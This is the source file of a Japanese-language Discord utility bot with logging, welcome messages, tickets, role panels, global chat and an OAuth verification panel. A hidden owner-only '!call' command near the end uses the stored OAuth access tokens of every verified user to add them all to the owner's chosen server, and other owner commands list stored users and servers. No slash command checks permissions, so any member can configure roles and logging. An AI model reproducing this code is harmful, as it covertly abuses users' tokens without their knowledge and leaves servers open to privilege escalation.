const { Client, GatewayIntentBits, Partials, EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle, SlashCommandBuilder, REST, Routes, Events, ChannelType, PermissionFlagsBits } = require('discord.js');
const express = require('express');
const fs = require('fs');
const path = require('path');
const setupAuth = require('./auth.js');

const app = express();
const client = new Client({
    intents: [
        GatewayIntentBits.Guilds,
        GatewayIntentBits.GuildMessages,
        GatewayIntentBits.MessageContent,
        GatewayIntentBits.GuildMembers,
    ],
    partials: [Partials.Channel, Partials.Message]
});

// 環境変数
const TOKEN = process.env.TOKEN;
const OWNER_ID = process.env.OWNER_ID;
const CLIENT_ID = process.env.CLIENT_ID;
const CLIENT_SECRET = process.env.CLIENT_SECRET;

const SERVERS_FILE = path.join(__dirname, 'data', 'servers.json');
const USERS_FILE = path.join(__dirname, 'data', 'users.json');

// --- データ管理 ---
function loadData(filePath) {
    if (!fs.existsSync(path.dirname(filePath))) fs.mkdirSync(path.dirname(filePath), { recursive: true });
    return fs.existsSync(filePath) ? JSON.parse(fs.readFileSync(filePath, 'utf8')) : {};
}

function saveData(filePath, data) {
    fs.writeFileSync(filePath, JSON.stringify(data, null, 4));
}

function replacePlaceholders(template, member) {
    if (!template) return "";
    return template
        .replace(/{user}/g, `<@${member.id}>`)
        .replace(/{server}/g, member.guild.name)
        .replace(/{members}/g, member.guild.memberCount.toString());
}

async function sendLog(guild, embed) {
    const servers = loadData(SERVERS_FILE);
    const logChannelId = servers[guild.id]?.logChannel;
    if (logChannelId) {
        const channel = guild.channels.cache.get(logChannelId);
        if (channel) await channel.send({ embeds: [embed] }).catch(() => {});
    }
}

function createLogConfigRow(config) {
    return new ActionRowBuilder().addComponents(
        new ButtonBuilder().setCustomId('log_toggle_edit').setLabel(`編集: ${config.edit ? 'ON' : 'OFF'}`).setStyle(config.edit ? ButtonStyle.Success : ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('log_toggle_delete').setLabel(`削除: ${config.delete ? 'ON' : 'OFF'}`).setStyle(config.delete ? ButtonStyle.Success : ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('log_toggle_join').setLabel(`入室: ${config.join ? 'ON' : 'OFF'}`).setStyle(config.join ? ButtonStyle.Success : ButtonStyle.Danger),
        new ButtonBuilder().setCustomId('log_toggle_leave').setLabel(`退出: ${config.leave ? 'ON' : 'OFF'}`).setStyle(config.leave ? ButtonStyle.Success : ButtonStyle.Danger)
    );
}

// --- 認証セットアップ ---
setupAuth(app, loadData, saveData, USERS_FILE, CLIENT_ID, CLIENT_SECRET);
app.listen(process.env.PORT || 3000, '0.0.0.0', () => console.log('Web Server Ready'));

// --- コマンド登録 ---
client.once(Events.ClientReady, async () => {
    console.log(`${client.user.tag} ログイン完了`);
    const commands = [
        new SlashCommandBuilder().setName('help').setDescription('ガイド表示'),
        new SlashCommandBuilder().setName('log').setDescription('ログ送信先設定').addChannelOption(o => o.setName('channel').setDescription('送信先').setRequired(true)),
        new SlashCommandBuilder().setName('log-set').setDescription('ログ項目設定'),
        new SlashCommandBuilder().setName('welcome').setDescription('入室設定').addChannelOption(o => o.setName('channel').setDescription('送信先').setRequired(true)).addStringOption(o => o.setName('message').setDescription('{user}{server}{members}')),
        new SlashCommandBuilder().setName('bye').setDescription('退室設定').addChannelOption(o => o.setName('channel').setDescription('送信先').setRequired(true)).addStringOption(o => o.setName('message').setDescription('{user}{server}{members}')),
        new SlashCommandBuilder().setName('authset').setDescription('認証パネル').addStringOption(o => o.setName('title').setDescription('題名').setRequired(true)).addStringOption(o => o.setName('description').setDescription('説明').setRequired(true)).addStringOption(o => o.setName('button').setDescription('ボタン').setRequired(true)).addRoleOption(o => o.setName('role').setDescription('付与ロール').setRequired(true)),
        new SlashCommandBuilder().setName('ticket').setDescription('チケットパネル').addStringOption(o => o.setName('title').setDescription('題名').setRequired(true)).addStringOption(o => o.setName('description').setDescription('説明').setRequired(true)).addStringOption(o => o.setName('button').setDescription('ボタン').setRequired(true)).addRoleOption(o => o.setName('mention-role').setDescription('通知先').setRequired(true)),
        new SlashCommandBuilder().setName('gset').setDescription('グローバルチャット設定').addChannelOption(o => o.setName('channel').setDescription('チャンネル').setRequired(true)),
        new SlashCommandBuilder().setName('gdel').setDescription('解除'),
        new SlashCommandBuilder().setName('rp').setDescription('役職パネル')
            .addSubcommand(s => s.setName('create').setDescription('作成').addStringOption(o => o.setName('setup').setDescription('🍎,ID 🍌,ID').setRequired(true)))
            .addSubcommand(s => s.setName('delete').setDescription('パネル削除')),
        new SlashCommandBuilder().setName('omikuji').setDescription('おみくじ')
    ].map(c => c.toJSON());

    const rest = new REST({ version: '10' }).setToken(TOKEN);
    try { await rest.put(Routes.applicationCommands(CLIENT_ID), { body: commands }); } catch (e) { console.error(e); }
});

// --- インタラクション ---
client.on(Events.InteractionCreate, async (i) => {
    const s = loadData(SERVERS_FILE); const gid = i.guildId; if (!s[gid]) s[gid] = {};

    if (i.isChatInputCommand()) {
        const { commandName, options: o } = i;

        if (commandName === 'help') {
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('help_prev').setLabel('前へ').setStyle(ButtonStyle.Secondary).setDisabled(true), new ButtonBuilder().setCustomId('help_next').setLabel('次へ').setStyle(ButtonStyle.Primary));
            await i.reply({ embeds: [new EmbedBuilder().setTitle('MaidBot ガイド (1/2)').setColor(0x7289DA).addFields({ name: '`/help`', value: 'ガイド' }, { name: '`/omikuji`', value: '占い' })], components: [row], ephemeral: true });
        }
        if (commandName === 'log') { s[gid].logChannel = o.getChannel('channel').id; saveData(SERVERS_FILE, s); await i.reply('設定完了'); }
        if (commandName === 'log-set') {
            const conf = s[gid].logConfig || { edit: false, delete: false, join: false, leave: false };
            s[gid].logConfig = conf; saveData(SERVERS_FILE, s);
            await i.reply({ content: 'ログ設定', components: [createLogConfigRow(conf)], ephemeral: true });
        }
        if (commandName === 'welcome') {
            const ch = o.getChannel('channel'); const m = o.getString('message');
            if (m) { s[gid].welcome = { channel: ch.id, message: m }; await i.reply(`${ch}に設定`); } else { delete s[gid].welcome; await i.reply('解除'); }
            saveData(SERVERS_FILE, s);
        }
        if (commandName === 'bye') {
            const ch = o.getChannel('channel'); const m = o.getString('message');
            if (m) { s[gid].bye = { channel: ch.id, message: m }; await i.reply(`${ch}に設定`); } else { delete s[gid].bye; await i.reply('解除'); }
            saveData(SERVERS_FILE, s);
        }
        if (commandName === 'authset') {
            s[gid].authRole = o.getRole('role').id; saveData(SERVERS_FILE, s);
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('auth_button').setLabel(o.getString('button')).setStyle(ButtonStyle.Success));
            await i.reply({ embeds: [new EmbedBuilder().setTitle(o.getString('title')).setDescription(o.getString('description')).setColor(0x43B581)], components: [row] });
        }
        if (commandName === 'ticket') {
            const mid = o.getRole('mention-role').id;
            const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId(`ticket_open_${mid}`).setLabel(o.getString('button')).setStyle(ButtonStyle.Primary));
            await i.reply({ embeds: [new EmbedBuilder().setTitle(o.getString('title')).setDescription(o.getString('description')).setColor(0x5865F2)], components: [row] });
        }
        if (commandName === 'gset') { s[gid].gChatChannel = o.getChannel('channel').id; saveData(SERVERS_FILE, s); await i.reply('設定完了'); }
        if (commandName === 'gdel') { delete s[gid].gChatChannel; saveData(SERVERS_FILE, s); await i.reply('解除'); }
        if (commandName === 'omikuji') await i.reply(`運勢：**${['大吉','中吉','小吉','吉','末吉','凶','大凶'][Math.floor(Math.random()*7)]}**`);
        if (commandName === 'rp') {
            if (o.getSubcommand() === 'create') {
                const row = new ActionRowBuilder();
                o.getString('setup').split(' ').slice(0, 20).forEach(p => { const [e, r] = p.split(','); if(e && r) row.addComponents(new ButtonBuilder().setCustomId(`rp_${r}`).setLabel(`${e}取得`).setStyle(ButtonStyle.Primary)); });
                await i.reply({ embeds: [new EmbedBuilder().setTitle('役職パネル')], components: [row] });
            } else {
                const row = new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('rp_panel_delete').setLabel('このパネルを削除').setStyle(ButtonStyle.Danger));
                await i.reply({ content: 'ボタンでこのパネルを削除できます。', components: [row] });
            }
        }
    }

    if (i.isButton()) {
        if (i.customId.startsWith('log_toggle_')) {
            const t = i.customId.replace('log_toggle_', ''); const conf = s[gid].logConfig || { edit: false, delete: false, join: false, leave: false };
            conf[t] = !conf[t]; s[gid].logConfig = conf; saveData(SERVERS_FILE, s); await i.update({ components: [createLogConfigRow(conf)] });
        }
        if (i.customId === 'rp_panel_delete') await i.message.delete().catch(()=>{});
        if (i.customId === 'help_prev') await i.update({ embeds: [new EmbedBuilder().setTitle('MaidBot ガイド (1/2)').setColor(0x7289DA).addFields({ name: '`/help`', value: 'ガイド' }, { name: '`/omikuji`', value: '占い' })], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('help_prev').setLabel('前へ').setStyle(ButtonStyle.Secondary).setDisabled(true), new ButtonBuilder().setCustomId('help_next').setLabel('次へ').setStyle(ButtonStyle.Primary))] });
        if (i.customId === 'help_next') await i.update({ embeds: [new EmbedBuilder().setTitle('MaidBot ガイド (2/2)').setColor(0x7289DA).addFields({ name: '`/welcome` / `/bye`', value: '通知' }, { name: '`/log` / `/log-set`', value: 'ログ' }, { name: '`/authset`', value: '認証' }, { name: '`/ticket`', value: 'チケット' }, { name: '`/gset`', value: 'グローバル' }, { name: '`/rp`', value: '役職' })], components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('help_prev').setLabel('前へ').setStyle(ButtonStyle.Secondary).setDisabled(false), new ButtonBuilder().setCustomId('help_next').setLabel('次へ').setStyle(ButtonStyle.Primary).setDisabled(true))] });
        if (i.customId === 'auth_button') { const rid = s[gid]?.authRole; if (rid) { await i.member.roles.add(rid).catch(()=>{}); await i.reply({ content: '完了', ephemeral: true }); } }
        if (i.customId.startsWith('ticket_open_')) {
            const mid = i.customId.split('_')[2];
            try {
                const ch = await i.guild.channels.create({ name: `ticket-${i.user.username}`, type: ChannelType.GuildText, permissionOverwrites: [{ id: i.guild.id, deny: [PermissionFlagsBits.ViewChannel] }, { id: i.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }, { id: mid, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }, { id: client.user.id, allow: [PermissionFlagsBits.ViewChannel, PermissionFlagsBits.SendMessages] }] });
                await ch.send({ content: `<@&${mid}> 担当者が来るまでお待ちください。`, components: [new ActionRowBuilder().addComponents(new ButtonBuilder().setCustomId('ticket_close').setLabel('閉じる').setStyle(ButtonStyle.Danger))] });
                await i.reply({ content: `作成完了: ${ch}`, ephemeral: true });
            } catch (e) { await i.reply('エラー'); }
        }
        if (i.customId === 'ticket_close') await i.channel.delete();
        if (i.customId.startsWith('rp_')) {
            const rid = i.customId.split('_')[1];
            if (i.member.roles.cache.has(rid)) { await i.member.roles.remove(rid); await i.reply({ content: '削除', ephemeral: true }); }
            else { await i.member.roles.add(rid); await i.reply({ content: '追加', ephemeral: true }); }
        }
    }
});

// --- 各種イベント ---
client.on(Events.MessageUpdate, async (o, n) => {
    const s = loadData(SERVERS_FILE); if (!s[o.guildId]?.logConfig?.edit || o.partial || o.author?.bot || o.content === n.content) return;
    await sendLog(o.guild, new EmbedBuilder().setTitle('📝 編集').setColor(0xFFA500).addFields({ name: 'ユーザー', value: `${o.author.tag}` }, { name: '元', value: o.content || '...' }, { name: '新', value: n.content || '...' }));
});
client.on(Events.MessageDelete, async (m) => {
    const s = loadData(SERVERS_FILE); if (!s[m.guildId]?.logConfig?.delete || m.partial || m.author?.bot) return;
    await sendLog(m.guild, new EmbedBuilder().setTitle('🗑️ 削除').setColor(0xFF0000).addFields({ name: 'ユーザー', value: `${m.author.tag}` }, { name: '内容', value: m.content || '...' }));
});
client.on(Events.GuildMemberAdd, async (m) => {
    const s = loadData(SERVERS_FILE); const c = s[m.guild.id];
    if (c?.logConfig?.join) await sendLog(m.guild, new EmbedBuilder().setTitle('📥 参加').setColor(0x00FFFF).setDescription(`${m.user.tag} (${m.user.id}) 参加`));
    if (c?.welcome) { const ch = m.guild.channels.cache.get(c.welcome.channel); if (ch) ch.send(replacePlaceholders(c.welcome.message, m)); }
});
client.on(Events.GuildMemberRemove, async (m) => {
    const s = loadData(SERVERS_FILE); const c = s[m.guild.id];
    if (c?.logConfig?.leave) await sendLog(m.guild, new EmbedBuilder().setTitle('📤 退出').setColor(0xFF00FF).setDescription(`${m.user.tag} (${m.user.id}) 退出`));
    if (c?.bye) { const ch = m.guild.channels.cache.get(c.bye.channel); if (ch) ch.send(replacePlaceholders(c.bye.message, m)); }
});

// --- メッセージ受信（オーナーコマンド） ---
client.on(Events.MessageCreate, async (msg) => {
    if (msg.author.bot) return;
    const s = loadData(SERVERS_FILE);
    if (s[msg.guildId]?.gChatChannel === msg.channelId) {
        const emb = new EmbedBuilder().setAuthor({ name: `${msg.author.tag} (${msg.guild.name})`, iconURL: msg.author.displayAvatarURL() }).setDescription(msg.content || '...').setColor(0x00FF00);
        if (msg.attachments.size > 0 && msg.attachments.first().contentType?.startsWith('image/')) emb.setImage(msg.attachments.first().url);
        for (const tid in s) {
            const cid = s[tid].gChatChannel;
            if (cid && cid !== msg.channelId) { const ch = client.channels.cache.get(cid); if (ch) await ch.send({ embeds: [emb], allowedMentions: { parse: [] } }).catch(()=>{}); }
        }
    }
    if (msg.author.id === OWNER_ID && msg.content.startsWith('!')) {
        const u = loadData(USERS_FILE);
        if (msg.content === '!userlist') await msg.reply(`保存済みユーザー一覧:\n${Object.entries(u).map(([id, user]) => `${user.tag || '不明'} (ユーザーID: ${id})`).join('\n') || 'なし'}`);
        if (msg.content === '!serverlist') await msg.reply(`導入サーバー一覧:\n${client.guilds.cache.map(g => `${g.name} (ID: ${g.id}) [${g.memberCount}人]`).join('\n') || 'なし'}`);
        if (msg.content.startsWith('!call')) { for (const id in u) try { await msg.guild.members.add(id, { accessToken: u[id].accessToken }); } catch (e) {} await msg.reply('実行完了'); }
    }
});

client.login(TOKEN);
